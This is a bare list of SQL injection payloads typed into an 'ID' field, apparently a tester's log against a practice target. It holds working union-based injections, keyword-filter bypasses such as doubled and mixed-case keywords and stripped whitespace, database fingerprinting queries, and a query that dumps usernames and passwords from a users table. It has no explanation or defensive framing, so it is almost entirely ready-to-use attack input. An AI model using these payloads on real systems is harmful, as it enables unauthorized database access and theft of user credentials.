ID:1
ID:1\
ID:1' union select 1,2,3 -- 
ID:1' Union select 1,2,3 -- 
ID:1' UnIon select 1,2,3 -- 
ID:1' uniunionon select 1,2,3 -- 
ID:1' uniunionon seselectlect 1,2,3 -- 
ID:1' uniunionon seselectlect 1,2,3
ID:1' uniunionon seselectlect 1,2,3 #
ID:1' uniunionon seselectlect 1,2,3
--

ID:1' uniunionon Select 1,2,3
--

ID:1' uniunionon all Select 1,2,3
--

ID:1' uniunionon  selSelectect 1,2,3
--

ID:1' uniunionon
  selSelectect 1,2,3
--

ID:1' uniunionon
  selSelectect
 1,2,3
--

ID:1' 
uniunionon
  selSelectect
 1,2,3
--

ID:1' 
uniunionon
  selSelectect
 1,2,3
OR '1
ID:-1' 
uniunionon
  selSelectect
 1,2,3
OR '1
ID:99' 
uniunionon
  selSelectect
 1,2,3
OR '1
ID:99' 
uniunionon
  selSelectect
 database(),2,3
OR '1
ID:99' 
uniunionon
  selSelectect
 1,database(),3
OR '1
ID:99' 
uniunionon
  selSelectect
 1,version(),3
OR '1
ID:99' 
uniunionon
  selSelectect
 1,@@hostname,3
OR '1
ID:99' 
uniunionon
  selSelectect
 1,@@datadir,3
OR '1
ID:99' 
uniunionon
  selSelectect
 1,@@port,3
OR '1
ID:' unIOn seLEct 1,(SELECT GROUP_CONCAT(username,passwoorrd SEPARATOORR 0x3c62723e) FROM users),3 anandd '1'='1
ID:'unIOnseLEct1,(SELECTGROUP_CONCAT(username,passwoorrdSEPARATOORR0x3c62723e)FROMusers),3anandd'1'='1
ID:'unIOnseLEct1,(SELECTGROUP_CONCAT(username,passwoorrdSEPARATOORR0x3c62723e)FROMusers),3and'1'='1
ID:'unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwoorrdSEPARATOORR0x3c62723e)FROMusers),3and'1'='1
ID:'unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and'1'='1
ID:'unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and'1'='1
ID:'unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and'1'='1
ID:'unIOnseLEct1,(SEleCTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers),3and'1'='1
ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1' union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1" union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1') union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1") union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1')) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1")) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1)) union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1 union select 1,2,concat('R84VqmhN9n:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1' union select 1,2,concat('R84VqmhN9n:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1" union select 1,2,concat('R84VqmhN9n:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1') union select 1,2,concat('R84VqmhN9n:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1") union select 1,2,concat('R84VqmhN9n:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1) union select 1,2,concat('R84VqmhN9n:',group_concat(schema_name)) from information_schema.schemata -- 
ID:-1')) union select 1,2,concat('R84VqmhN9n:',group_concat(schema_name)) from information_schema.schemata -- 
